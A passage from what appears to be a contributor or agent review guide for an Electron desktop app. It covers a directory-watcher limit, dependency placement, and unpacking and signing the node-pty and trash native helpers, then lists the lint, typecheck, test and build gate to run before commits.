  must not spam refetches), watchers are capped per sender (extras fall back to the
  3s-stale tab switch), and a burst of events is debounced into one send. It must NEVER
  become a recursive tree watch (the 50 GB / `node_modules` churn trap) and `readDir`
  must keep its 30s cache. Watchers are reaped on window close via `clearWatchedDirs`
  (next to `clearWatchedFiles`).

## Packaging

- **Main/preload deps stay in `dependencies`; renderer-only libs in `devDependencies`.**
  electron-vite externalizes main/preload imports and electron-builder copies them
  *whole* into `app.asar`; Vite bundles renderer libs regardless of section.
  Misplacing a dep either bloats the bundle (~100 MB regression) or breaks the
  packaged app at runtime. *Verify:* a dep imported by `src/main`/`src/preload`
  must be in `dependencies`.
- **Never map an empty `CSC_LINK` into the release env.** A defined-but-empty value
  makes electron-builder attempt signing and die with `<projectDir> not a file` —
  set it real or omit it entirely. (See the `releasing` skill.)
- **`node-pty` is the lone native module — keep it unpacked, rebuilt, and signed.**
  It loads in the main process, so it stays in `dependencies` (externalized, copied
  whole into the app), is rebuilt for Electron's ABI by `electron-builder install-app-deps`
  (and listed in `onlyBuiltDependencies` so pnpm allows its build), and `electron-builder.yml`
  `asarUnpack`s `node_modules/node-pty/**` — both `pty.node` AND the `spawn-helper`
  binary it `exec`s must live on disk outside `app.asar` and be code-signed/notarized,
  or the packaged app's terminal can't spawn (a PTY fails, or notarization rejects an
  unsigned Mach-O). *Why:* this is the app's first native dependency; nothing else
  needs unpacking. *Verify:* a packaged build's `Resources/app.asar.unpacked/node_modules/node-pty`
  exists and the terminal opens. The renderer half (`@xterm/*`) is Vite-bundled
  `devDependencies` — no packaging concern.
- **`trash` joins node-pty in `asarUnpack` AND patches its helper URL.** The `trash`
  package (the electron-free
  daemon's replacement for `shell.trashItem`, used by `trashPath`/`gitDiscardFile` in
  `src/backend/api.ts`) ships platform helper binaries (`macos-trash`) it `exec`s at
  runtime, so `electron-builder.yml` `asarUnpack`s `node_modules/trash/**` too. *Why:* a
  helper binary packed inside `app.asar` can't be executed — trashing would fail in the
  packaged app. Unpacking alone is insufficient: `trash` derives the helper URL from its
  module inside `app.asar`, and `execFile` fails with `spawn ENOTDIR` unless that URL is
  redirected to the sibling `app.asar.unpacked`. The pinned pnpm patch in
  `patches/trash@10.1.1.patch` performs only that segment rewrite, leaving plain-Node and
  non-ASAR installs unchanged. *Verify:* `node_modules/trash/**` is in the `asarUnpack` list
  alongside node-pty and `trash-packaging.test.ts` passes. The main bundles are CJS while
  `trash` is ESM-only, so `electron.vite.config.ts`
  sets `output.interop: 'auto'` — without it the `require` returns a namespace object and
  every daemon trash call throws "trash is not a function" (it slipped through the unit gate
  because only e2e exercises a real daemon trash; don't drop the interop setting).

## How to verify

- The gate before any commit: `pnpm lint && pnpm typecheck && pnpm test && pnpm build`
  must all pass (hard rule 3).
- Invariants above that the gate does **not** catch (security guards, git env flags,
  dep placement) need a human/agent read of the diff — that's what this
  skill is for. When reviewing, walk this list against the changed files.
